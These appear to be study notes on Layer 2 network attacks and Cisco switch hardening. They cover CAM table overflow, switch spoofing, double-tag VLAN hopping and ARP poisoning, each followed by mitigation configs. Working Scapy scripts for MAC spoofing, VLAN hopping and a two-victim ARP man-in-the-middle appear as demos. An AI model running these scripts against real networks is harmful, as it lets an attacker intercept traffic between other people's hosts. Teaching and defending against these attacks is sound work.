# Commands from book




Similar to a buffer overflow attack, the goal is to fill the switches table with "learned" MAC addresses and see what happens. The attacker sits on one port and generates a vast number of "spoofed" MAC entries. When the CAM table is full, all additional MACs will not be learned and will default to "open". This means that traffic without a CAM entry will be flooded out on all ports of the VLAN in question. Traffic with a CAM entry won’t be affected, but neighbor switches could be.

Depending on the switch in question, this type of attack can be mitigated.
```
switch(config)# interface fa0/10
switch(config-if)# switchport port security
switch(config-if)# switchport port security maximum 1
switch(config-if)# switchport port security violation shutdown
```






DEMO MAC Spoofing

Scapy Script to demonstrate MAC Spoofing
```
a=Ether()
a.dst="ff:ff:ff:ff:ff:ff"   #Specify any target MAC you require
a.src="01:02:03:aa:bb:cc"   #Insert your Spoofed MAC here
a.type=0x0800

b=IP()
b.proto=6               #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
b.src="10.10.0.40"      #Any source IP
b.dst="172.16.82.106"   #Target IP

c=TCP()
c.sport=54321
c.dport=80

d="message"

sendp(a/b/c/d)
```

Switch Spoofing

In this attack, an attacking host imitates a trunking switch by crafting Dynamic Trunking Protocol (DTP) frames in order to form a trunk link with the switch. With a trunk link formed the attacker can then use tagging and trunking protocols such as ISL or 802.1q. Traffic for all VLANs is then accessible to the attacking host.
```
switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
```


Double Tagging

This attack works if the attacker knows what the "native VLAN" that is used on your organization. Typically VLAN 1 is used. All VLANs will be "tagged" with its corresponding VLAN. The Native VLAN however is intended for local network communication and is not tagged. Thus anything tagged for the native VLAN will be stripped off. The attacker will insert 2 tags into their frames. The first tag will be for the Native VLAN and the second tag will be for whatever VLAN he is trying to access. Upon receipt the switch will then remove the Native VLAN tag and will leave the second VLAN tag in tact. This method also requires that the attacker and victim be separated by a trunk and a vulnerable switch.

```
switch(config)# vlan dot1q tag native
switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport trunk native vlan 999
```


DEMO VLAN Hopping

Scapy Script to demonstrate VLAN Hopping
```
a=Ether()
a.dst="ff:ff:ff:ff:ff:ff"
a.src="01:02:03:aa:bb:cc"
a.type=0x8100           #VLAN Tag will Follow

b=Dot1Q()
b.vlan=1                #Insert the network's Native VLAN number
b.type=0x8100           #Another VLAN Tag will Follow

c=Dot1Q()
c.vlan=20               #Target VLAN
c.type=0x0800           #IPv4 or any other Ethertype that is encapsulated

d=IP()
d.proto=6               #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
d.src="10.10.0.40"      #Any source IP
d.dst="172.16.82.106"   #Target IP

e=TCP()
e.sport=54321
e.dport=80

f="message"

a.show()
b.show()
c.show()
d.show()
e.show()

sendp(a/b/c/d/e/f)
```

ARP Cache - is a collection of Layer 2 to Layer 3 address mappings discovered utilizing the ARP request/response process. When a host needs to send a packet both the L2 and L3 addresses are needed. The host will look in this table to determine if it already knows both the L2 and L3 addresses. If the target is not in the table then a ARP request is initiated. The ARP cache can be populated statically but mostly its done dynamically. This cache can be exploited by attackers with the aim to poison the cache with incorrect information to either perform a DoS or MitM.
```
arp -a
ip neighbor
```

Demonstrate man-in-the-middle (MitM) with ARP


DEMO ARP MitM attack
```
my_mac = ""             #Insert Your MAC address
victim1_mac = ""        #Insert victim1 MAC address
victim1_ip = ""         #Insert victim1 IP address
victim2_mac = ""        #Insert victim2 MAC address
victim2_ip = ""         #Insert victim2 IP addres

# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
a = Ether()
a.src= my_mac
a.dst= victim1_mac
a.type= 0x0806

b = ARP()
b.op= 2
b.hwsrc= my_mac
b.psrc= victim2_ip    #Who you are pretending to be
b.hwdst= victim1_mac  #Who's ARP cache you are trying to poison
b.pdst= victim1_ip    #Who's ARP cache you are trying to poison

# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
c = Ether()
c.src= my_mac
c.dst= victim2_mac
c.type= 0x0806

d = ARP()
d.op= 2
d.hwsrc= my_mac
d.psrc= victim1_ip    #Who you are pretending to be
d.hwdst= victim2_mac  #Who's ARP cache you are trying to poison
d.pdst= victim2_ip    #Who's ARP cache you are trying to poison

a.show()
b.show()
c.show()
d.show()

sendp(a/b); sendp(c/d)
```


Layer 2 Attack mitigation techniques
The following are some mechanisms that can be be configured to better secure your switched network:

Shutdown unused ports - Bare minimum to secure access ports is to simply shut down any and all inactive ports.
```
interface fastethernet 0/1
shutdown
```
Switchport Port Security - Can be used to limit the number of MAC addresses that can be dynamically learned on a port or static MAC addresses can be assigned to one. Violation modes of shut down can be used to secure the port should a violation occur.
```
switchport port-security
switchport port-security maximum 1
switchport port-security mac-address sticky
switchport port-security violation shutdown
```
IP Source Guard - Mitigates the effects of IP address spoofing attacks on the Ethernet LAN. With IP source guard enabled, the source IP address in the packet sent from an untrusted access interface is validated against the DHCP snooping database. If the packet cannot be validated, it is discarded.
```
interface fastethernet 0/1
ip verify source
ip source binding 0100.0230.0002 vlan 11 10.10.0.40 interface fastethernet 0/1
```
Manually assign STP Root - Manually assign the Spanning Tree Protocol (STP) root bridge allows for a deterministic root bridge election rather than the bridge with the lowest bridge priority. This allows the central most switch to be the root that will best allow traffic to flow in an efficent manner.
```
spanning-tree vlan <vlan-id> priority 0
```
BPDU Guard - BPDU Guard is a feature used in network switches to enhance network security by protecting against unintentional loops and rogue devices. It works by automatically shutting down a port if it receives Bridge Protocol Data Units (BPDUs), which are indicative of spanning tree protocol (STP) activity.
```
interface fastethernet 0/1
spanning-tree bpduguard enable
```
DHCP Snooping - DHCP Snooping is a security feature commonly found in network switches that helps prevent rogue or unauthorized DHCP servers from distributing incorrect or malicious IP configuration information to network clients. It operates by monitoring and controlling DHCP messages exchanged between DHCP clients and servers. Configuration is done on ports that are connected to (or leading to) the DHCP server.
```
ip dhcp snooping
interface fastethernet 0/1
 ip dhcp snooping trust
 ip dhcp snooping vlan <vlan-id>
```

802.1x - The 802.1x standard defines a client-server-based access control and authentication protocol that prevents unauthorized clients from connecting to a LAN through ports until they are properly authenticated. The authentication server authenticates each client connected to a switchport before making available any services offered by the switch or the LAN.

```
aaa new-model
aaa authentication dot1x default group radius
dot1x system-auth-control
identity profile default
interface fastethernet 0/1
access-session port-control auto
dot1x pae authenticator
```
Dynamic ARP inspection (DAI) - Prevents Address Resolution Protocol (ARP) spoofing or “man-in-the-middle” attacks. ARP requests and replies are compared against entries in the DHCP snooping database, and filtering decisions are made on the basis of the results of those comparisons.
```
ip arp inspection vlan {vlan-id> | <vlan-range>}
interface fastethernet 0/1
ip arp inspection [ trust | untrust ]
ip arp inspecion filter <arp-acl-name> vlan {vlan-id> | <vlan-range>} [static]
```
Static CAM entries - Static CAM (Content Addressable Memory) entries refer to manually configured entries in the CAM table of Ethernet switches. These entries map specific MAC addresses to specific switch ports and are used to optimize network performance and facilitate specific network configurations.
```
mac-address-table static 1234:abcd:5678 vlan 1 interface fastethernet 0/1
```
Static ARP entries - Static ARP (Address Resolution Protocol) entries are manually configured mappings between IP addresses and MAC addresses in the ARP table of network devices. These entries are used to ensure stable communication between specific devices on the network.
```
Linux:
sudo ip neighbor add 10.10.0.50 lladdr 11:22:33:44:55:66 nud permanent dev eth0
sudo ip neighbor delete 10.10.0.50 lladdr 11:22:33:44:55:66 nud permanent dev eth0
Windows:
arp -s 10.10.0.50 11:22:33:44:55:66
```
Disable DTP negotiations - To disable Dynamic Trunking Protocol (DTP) negotiations on a Cisco switch interface, you need to manually configure the interface as an access port or set it to operate in a specific trunking mode, such as "trunk" or "nonegotiate."

```
interface fastethernet 0/1
 switchport mode trunk
 switchport nonegotiate
interface fastethernet 0/2
 switchport mode access
 switchport nonegotiate
```
Manually assign Access/Trunk ports - By default, switch ports can be either a trunk or access port depending on the device connected to the port and dynamic negotiations that take place. Manually assigning ports as either trunk or access ports provides greater control and ensures that the network operates as intended.

```
interface fastethernet 0/1
 switchport mode trunk
 switchport nonegotiate
interface fastethernet 0/2
 switchport mode access
 switchport nonegotiate
```

















